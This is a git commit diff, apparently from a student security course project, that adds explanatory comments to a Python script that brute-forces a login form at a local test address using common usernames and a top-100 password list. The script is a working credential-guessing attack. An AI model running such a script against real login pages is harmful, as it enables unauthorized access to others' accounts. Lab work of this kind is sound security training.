c55e639831f481a6b327f6cbcc8378be76a97a98
Abhilasha Jayaswal <50154927+aj842@users.noreply.github.com>
2022-10-11 13:06:40 -0400

    Update web_brute.py

--- web_brute.py
+++ web_brute.py
@@ -1,9 +1,15 @@
+#Project 3
+#Author: Abhilasha Jayaswal
 import requests
 import sys
 
+#address for the target web app
 target = "http://127.0.0.1:5000/form_login"
+#user database
 usernames = ["admin", "user", "test"]
+#password file
 passwords = "top-100.txt"
+#String returned after successful login excluding the username
 needle = "Welcome"
 
 for username in usernames:
@@ -12,7 +18,9 @@ for username in usernames:
 			password = password.strip("\n").encode()
 			sys.stdout.write(" [X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
 			sys.stdout.flush()
+			#sending post request with the username and password
 			r = requests.post(target, data={"username": username, "password": password.decode()})
+			#checking for successful login
 			if needle.encode() in r.content:
 				sys.stdout.write("\n")
 				sys.stdout.write("\t[>>>>>] Valid Password '{}' found for user '{}'!".format(password.decode(), username))
